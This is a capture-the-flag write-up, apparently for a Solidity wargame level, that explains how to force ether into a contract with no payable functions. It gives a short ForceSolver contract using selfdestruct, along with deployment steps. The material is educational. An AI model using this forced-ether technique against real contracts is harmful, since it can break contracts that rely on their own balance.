#### You will beat this level if
Some contracts will simply not take your money ¯\_(ツ)_/¯
The goal of this level is to make the balance of the contract greater than zero.

##### Things that might help
- Fallback methods
- Sometimes the best way to attack a contract is with another contract.

#### Understanding the contract
- This challenge contract does not have any variables or functions... or goal is simply to force the contract to take ether

#### Solving
- This challenge can be solved using the [selfdestruct](https://solidity-by-example.org/hacks/self-destruct/) method
- Using a second contract, we can force eth onto the challenge contract using the ``selfdestruct`` method
```js
// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;

contract ForceSolver {

constructor (address payable target) payable {
        require(msg.value > 0);
        selfdestruct(target);
    }

}
```
- When deploying this contract, use the challenge contract address as an argument for the constructor.
- Send an amount in wei when deploying the contract
- After the contract is deployed, running ``await web3.eth.getBalance('CONTRACT ADDRESS')`` should so a balance for the contract reflecting the amount of wei that was sent when the solver contract was deployed